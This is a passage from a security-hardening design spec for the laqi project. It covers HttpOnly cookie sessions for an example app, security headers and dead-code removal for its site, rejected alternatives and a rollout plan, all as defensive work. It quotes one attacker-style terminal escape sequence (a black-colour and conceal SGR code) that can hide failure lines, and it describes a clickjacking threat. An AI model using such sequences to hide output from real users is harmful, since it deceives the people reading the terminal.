- `auth.ts` **must** keep only `User` in client state. The cookie the client writes (if any) is a non-secret `laqi_demo_user` carrying `{ user }` for hydration, or the user is kept in memory and re-fetched from `GET /profile` on load. Either way `readSession` **must** validate the parsed shape with a type guard before use (no `as Session`), and the type `Session` becomes `{ user: User }`.
- `api.ts` **must** drop the `Authorization` header; `fetch` defaults to `credentials: 'same-origin'`, and the Vite proxy (`vite.config.ts`, `/api` → laqi) is same-origin, so the browser sends the cookie on every call. The comment **must** say that an API on another origin would need `credentials: 'include'`, CORS with a specific origin, and the same cookie attributes.
- `login.tsx` **must** add `autoComplete="username"` and `autoComplete="current-password"`; `signup` `autoComplete="new-password"`.
- `profile.tsx` 401 handling stays: a 401 clears the client's user and navigates to login; the README's flip table row `GET /profile → unauthorized` keeps working.
- The header comment in `auth.ts` **must** state the rule in one line: the token lives in an `HttpOnly` cookie the server sets; the client only knows whether it is signed in.

**Unverified:** that Vite's dev proxy forwards `Set-Cookie` unchanged (http-proxy does by default and `changeOrigin` affects the `Host` header only; a five-minute check in step C). **Dependency:** NIW2-315's response-header validation must keep `Set-Cookie` allowed on the local listener; on the shared listener a `Set-Cookie` from a mock is NIW2-309's concern.

### 3.4 Tests

The example has no tests and is outside the root `vitest.config.ts` include (`'{packages,apps}/*/src/**/*.test.{ts,tsx}'`, `:5`). Add `examples/todo-app/src/lib/auth.test.ts` and extend the root include with `'examples/*/src/**/*.test.{ts,tsx}'` (one line; NIW2-312 also edits `verify` scope, so announce it). Cases: `rejects a cookie that is not a user` (`'{"token":"x"}'` → `null`), `accepts a well-formed user` (`{ user: { id: 1, name, email } }` → that object), `writes no token into any cookie` (after `writeSession`, `document.cookie` does not contain `laqi-demo-token`). A mock-level test in `apps/cli/src/index.test.ts` style (`runUntil` with `examples/todo-app/laqi` as the mocks dir): `POST /auth/login` → response has `set-cookie` with `HttpOnly` and no `token` in the body.

### 3.5 Compatibility

Examples are excluded from releases (`release-please-config.json` `exclude-paths`); nothing published changes. The README's flip table gains the logout row and loses nothing.

## Part 4 — Site (`apps/site`)

### 4.1 Current behaviour

- Deploy target: `.github/workflows/deploy-site.yml` runs `cloudflare/wrangler-action` `deploy` with `apps/site/wrangler.jsonc`, which is **Workers static assets** (`"assets": { "directory": "./dist" }`, custom domains `laqi.dev` and `www.laqi.dev`, `workers_dev: false`). `design/public-site.md` ("Deploy target: Cloudflare Pages, not Workers") is stale on this point and should be corrected in passing; the comment in `wrangler.jsonc` already says why Workers.
- No `_headers` in `apps/site/public/` (listing verified) and no Worker script, so responses carry only Cloudflare's defaults (`Content-Type`, `Cache-Control`, `ETag`): no `X-Content-Type-Options`, no `Referrer-Policy`, no `frame-ancestors`.
- `set:html` on literals: `src/components/home/CodeWindow.astro:41` renders `line.html` from a `CodeLine` prop (`:12-15`); `src/components/home/CreateRow.astro:62,76` render component-local literal arrays. No caller passes data today.
- Dead code: `src/components/{QuickStart,FinalCta,ForWhom,McpSection,ResolutionLayers,SiteNav,InstallCommand}.astro`, `src/lib/version.ts` and `version.test.ts`, each headed "UNUSED since 2026-10-02 … Delete on or after 2026-11-02". Grep over `src/` and `scripts/` finds no reference outside the dead set. `scripts/site/documented-commands.test.ts:13-17` scans `apps/site/src/components`, so stale commands in dead files still gate CI; `version.ts` reads `../../../cli/package.json` at module load.
- The only clipboard write is the install button, `src/components/home/Hero.astro:77,147`, from a static `data-copy`.

### 4.2 Threat

Clickjacking is the realistic one: laqi.dev framed on a hostile page with the install button under a transparent overlay (the copied command is the site's main action). `nosniff` and a referrer policy are hygiene. The `set:html` risk is future-only (a contributor builds `lines` from content).

### 4.3 Designed behaviour

**Headers (decision 9).** `apps/site/public/_headers` **must** exist; Astro copies `public/` into `dist/`, and Workers static assets parse the file at the root of the asset directory and apply it to asset responses (Cloudflare docs in References; `_headers` is not served). Phase 1 content:

```
/*
  X-Content-Type-Options: nosniff
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: camera=(), microphone=(), geolocation=()
  X-Frame-Options: DENY
  Content-Security-Policy: frame-ancestors 'none'; object-src 'none'; base-uri 'self'; form-action 'self'
```

`frame-ancestors` **must** be in a header (a `<meta>` CSP ignores it), which is why decision 9 is a `_headers` file and not Astro's `security.csp`. Phase 2 (`script-src`, `style-src`, `img-src`, `connect-src 'self'`) needs the inline-script inventory from open question 4; the phase 1 directives are chosen because they need no hashes and cannot break the site.

The old Pages-era wording in `design/public-site.md` **must** be corrected to "Workers static assets" where it names the target.

**Dead code (decision 10).** The seven components, `src/lib/version.ts` and `src/lib/version.test.ts` **must** be deleted. `documented-commands.test.ts` keeps scanning `src/components`; after the deletion the scan is the live surface only.

**`set:html`.** `CodeWindow` **must** take `tokens: { kind: string; text: string }[]` per line and render `<span class={`tok-${kind}`}>{text}</span>` with Astro's default escaping; the `html: string` prop is removed. `CreateRow` keeps its local literals with a one-line comment that the arrays are source-controlled markup and must never be built from content or props.

### 4.4 Tests

`scripts/site/headers.test.ts` (root vitest already includes `scripts/**/*.test.ts`): `the site ships security headers for every path` — parse `apps/site/public/_headers`, assert a `/*` block exists and sets `X-Content-Type-Options: nosniff`, `Referrer-Policy`, and a `Content-Security-Policy` containing `frame-ancestors 'none'`; `the built site carries the headers file` — after `astro build` in CI (`validate.yml` builds the site), `apps/site/dist/_headers` exists (skip when `dist` is absent locally). A post-deploy `curl -sI https://laqi.dev | grep -i frame-ancestors` is one line in `deploy-site.yml`, but that workflow is NIW2-312's file; propose it there.

`apps/site`: `astro check` already typechecks; removing `CodeLine.html` fails the build if any caller still passes HTML, which is the test.

### 4.5 Compatibility

No URL changes, no content changes. Cloudflare applies `_headers` only to asset responses; the site has no Worker code, so every response is an asset response.

## Alternatives considered and rejected

**Sanitize at the sources (core's `LoadError`, the CLI, the server) instead of in `@laqi/tui`.** Strongest argument for it: the data would be clean everywhere, including the panel and MCP. Rejected because each surface has a different escaping need (the panel escapes for HTML by construction, MCP must not alter file contents it reports), the terminal is the only surface where control characters execute, and a boundary at the sources is re-implemented per source and missed by the next source (PR #56's header value is exactly that case).

**Strip control characters silently.** Strongest argument: nothing odd ever appears on screen. Rejected because a silently cleaned excerpt no longer shows what is wrong with the file, and stripping hides tampering; the stand-in costs one glyph.

**Let `paint()`'s SGR sequences pass through a `sanitizePainted` backstop (the partial patch's approach).** Strongest argument: no signature change for `row`, no caller migration. Rejected because an attacker's `\x1b[38;2;0;0;0m` or SGR 8 (conceal) is indistinguishable from ours and can hide the line that reports the failure; decision 3 removes the need.

**Escape with caret notation (`^[`) instead of Control Pictures.** Strongest argument: renders on any terminal font. Kept as open question 1; the rest of the output already assumes Unicode.

**Validate response names in the panel to a conservative pattern instead of quoting.** Strongest argument: a clean grammar is better than quoting everywhere. Rejected as the only defence: the grammar is NIW2-315's and may allow spaces or punctuation; quoting is correct for any grammar.

**Wrap the create row in a `<form onSubmit>`.** Strongest argument: native semantics, Enter handled by the browser. Rejected only because the row has mode toggles and buttons inside it whose native submit behaviour would need `type="button"` audits and the Escape handling would stay custom; the target check is two lines and testable. A `<form>` is acceptable if the implementer prefers it, with the same tests.

**Server-side event ids and `Last-Event-ID` for resync.** Strongest argument: no refetch, exact replay. Rejected: the bus keeps no history by design, the stream is NIW2-309's file, and a refetch of four GETs per reconnect is the cost of one save.

**Keep the bearer token in the example and only warn.** Strongest argument: it keeps teaching the `Authorization: Bearer` shape, which many real APIs use, and it needs no laqi feature. Rejected as the primary design because a warning does not stop copying, and OWASP's guidance for browser-held session tokens is the cookie. Kept as the fallback in open question 3; if chosen, the minimum is the type guard, `Secure` on https, `autoComplete`, and the comment block from the partial patch.

**Astro `security.csp` for the site.** Strongest argument: hashes are generated per page, so a strict `script-src` is possible without a manual inventory. Rejected for phase 1 because it emits a `<meta>` tag, which cannot carry `frame-ancestors`, and it is still marked experimental in Astro 5. It is the right tool for phase 2's `script-src`.

**A Worker script that sets headers.** Strongest argument: full control, including non-asset responses. Rejected: there are no non-asset responses, and a script turns a static deploy into a runtime.

## Cross-ticket dependencies and file boundaries

| This ticket touches                                                                                                                                                                             | Owner of the surrounding code                               | Coordination                                                                     |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- | -------------------------------------------------------------------------------- |
| `packages/tui/**` (all)                                                                                                                                                                         | this ticket; PR #56 adds `stream.ts`                        | Step A lands first; PR #56 rebases and adopts `sanitize` + shared `clamp`.       |
| `apps/cli/src/index.ts` lines 164 and 358-421 only (`row` segments, `sanitize` on the mcp banner); `apps/cli/src/migrate.ts:159,189`; `apps/cli/src/goodbye.ts`; `apps/cli/src/init/run.ts:248` | NIW2-309 owns `serve.ts`, `index.ts` lifecycle, `tunnel.ts` | Small, localised hunks; NIW2-309 rebases over step A.                            |
| `apps/cli/src/index.test.ts` (new cases)                                                                                                                                                        | shared                                                      | Append only.                                                                     |
| `packages/editor/**`                                                                                                                                                                            | this ticket                                                 | `Share.token` in `types.ts` may change under NIW2-309; agree before step B.      |
| `examples/todo-app/**`                                                                                                                                                                          | this ticket                                                 | `Set-Cookie` must stay allowed by NIW2-315's header validation.                  |
| root `vitest.config.ts` include (one line)                                                                                                                                                      | NIW2-312 touches `verify`                                   | Announce; trivial merge.                                                         |
| `apps/site/public/_headers`, `apps/site/src/**` deletions, `scripts/site/headers.test.ts`, `design/public-site.md`, `design/terminal-output.md`                                                 | this ticket                                                 | `deploy-site.yml` is NIW2-312's; the post-deploy header check is proposed there. |
| `packages/server/**`, `packages/schema/**`, `packages/core/**`                                                                                                                                  | NIW2-309, NIW2-315, NIW2-313                                | Not touched here.                                                                |

Reading order for anyone implementing: this spec, `design/terminal-output.md`, `design/examples.md`, ADR-0007 (what `--share` exposes), ADR-0011 (what the panel is).

## Rollout

Each step is one PR with its own tests green; the order minimises conflicts.

- **A. `@laqi/tui` boundary** — `sanitize.ts`, `Segment` and `clamp` in `layout.ts`, renderers sanitize and paint, `renderFailure(columns?)`, CLI call sites migrate to segments, raw `console.*` sites wrapped, `design/terminal-output.md` trust-boundary section, the end-to-end CLI test. Then PR #56 rebases: `requestRow` sanitizes, `clamp` is the shared one, the two stream tests.
- **B1. Panel correctness** — `shell.ts` + curl builders + `copy()` helper; Enter from inputs + `pending`; `useEvents` reconnect + state + disconnected band.
- **B2. Panel performance** — log batching (store or per-frame flush), `memo(EndpointRow)`, memoized filter/overrides, memoized fingerprint, deferred dirty/validity, `HIGHLIGHT_LIMIT`.
- **C. Example app** — mocks gain `Set-Cookie` and `POST /auth/logout`; `auth.ts`/`api.ts`/`login.tsx` as in 3.3; README; `auth.test.ts` and the vitest include line. Verify the proxy forwards `Set-Cookie` before merging; if NIW2-315 forbids `Set-Cookie`, fall back per open question 3.
- **D1. Site headers** — `_headers` phase 1, `scripts/site/headers.test.ts`, `public-site.md` correction.
- **D2. Site dead code and `CodeWindow` tokens** — deletions, token prop, comment in `CreateRow`.

A, B1, C and D1 are independent and can run in parallel after this spec is accepted; B2 after B1; D2 after D1 only to keep PRs small.

## References

- Audit reports: `laqi/workspace-temp/audits/SUMMARY.md` (items 8, 9, 13, 17, P2), `editor.md` (Q1, Q2, Q7, S1, S2, X4, X5), `small-units.md` (tui, site, todo-app sections). Partial patch `partial-fixes/fix-ui-surfaces-hardening.patch` (ideas for `sanitize`, `shellQuote`, tests; its `sanitizePainted` is rejected above).
- Project docs: [terminal-output](/design/terminal-output/), [examples](/design/examples/), [public-site](/design/public-site/), [ADR-0007](/decisions/0007-public-url/), [ADR-0009](/decisions/0009-no-i18n/), [ADR-0011](/decisions/0011-panel-plain-react-spa/), Plan 13 (`plans/2026-09-02-13-terminal-request-stream.md`) and [PR #56](https://github.com/csdev19/laqi/pull/56).
- Reusable guidance hub: `~/Documents/Workspace/Personal/general-knowledge/architecture/security-hardening.md` (verification checklist shape); the hub has no page on terminal output or browser session storage yet, so this spec cites external sources rather than duplicating them.
- Terminal escape injection: [Black Hat USA 2023 — Weaponizing plain text: ANSI escape sequences as a forensic nightmare (appendix)](https://i.blackhat.com/BH-US-23/Presentations/US-23-stok-weponizing-plain-text-ansi-escape-sequences-as-a-forensic-nightmare-appendix.pdf); [Packetlabs — Weaponizing ANSI escape sequences](https://www.packetlabs.net/posts/weaponizing-ansi-escape-sequences/); [CVE-2026-48725 (Warp, OSC 52 without confirmation)](https://www.sentinelone.com/vulnerability-database/cve-2026-48725/); [pickem — terminal escape-sequence injection via unsanitized labels](https://securelayer7.net/lab/pickem-terminal-escape-sequence-injection-unsanitized-labels); [CVE-2026-47090 (Claude HUD, OSC 8 carrying OSC 52)](https://mondoo.com/vulnerability-intelligence/vulnerability/CVE-2026-47090); [CWE-150: Improper neutralization of escape, meta, or control sequences](https://vuln.today/cwe/CWE-150).
- Verified locally (Node v24.21.0, 2026-10-12): `JSON.parse` error text embeds the source; `new URL(...).pathname` keeps `%1B` encoded; Node's HTTP parser rejects ESC/DEL in request target and header values (`HPE_INVALID_URL`, `HPE_INVALID_HEADER_TOKEN`, `HPE_INVALID_METHOD`) but accepts byte `0x9B` in a header value.
- Sessions and cookies: [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) (Secure, HttpOnly, SameSite, `__Host-` prefix, "do not store … session IDs … in localStorage"); [OWASP ASVS v4 chapter 3 (annotated)](https://owasp-aasvs4.readthedocs.io/en/latest/V3.4.html).
- Site headers: [Cloudflare Workers static assets — Headers (`_headers`)](https://developers.cloudflare.com/workers/static-assets/headers/); [Cloudflare — Migrate from Pages (`_headers` supported natively)](https://developers.cloudflare.com/workers/static-assets/migration-guides/migrate-from-pages/); [Astro — experimental Content Security Policy](https://docs.astro.build/en/reference/experimental-flags/csp/) (meta-tag delivery, hashes, `directives`); [Astro 5.9 release notes](https://astro.build/blog/astro-590/).
